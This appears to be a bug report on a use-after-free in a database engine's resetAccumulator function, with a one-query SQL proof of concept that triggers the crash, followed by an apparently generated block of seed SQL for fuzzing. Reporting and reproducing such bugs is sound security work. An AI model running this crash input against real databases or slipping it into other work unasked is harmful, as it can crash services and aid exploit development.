title: Use after free in resetAccumulator.
description:
yongheng added on 2020-06-05 01:52:37:
Release version is affected.

POC:
---
CREATE TABLE a(b);
SELECT(SELECT b FROM a GROUP BY b HAVING(NULL AND b IN((SELECT COUNT() OVER(ORDER BY b) = lead(b) OVER(ORDER BY 3.100000 * SUM(DISTINCT CASE WHEN b LIKE 'SM PACK' THEN b * b ELSE 0 END) / b))))) FROM a EXCEPT SELECT b FROM a ORDER BY b, b, b;
---
bug_features_seed: CREATE TABLE test_table(id INT PRIMARY KEY, value VARCHAR(255), amount DECIMAL(10, 2) CHECK(amount >= 0));
INSERT INTO test_table(value, amount) VALUES('test2', NULL);
SELECT value FROM test_table WHERE amount IS NOT NULL AND value IN (SELECT value FROM test_table WHERE amount < 20.0);
SELECT COUNT(*) FROM test_table WHERE value LIKE '%test%' AND (amount IS NULL OR amount > 5.0);
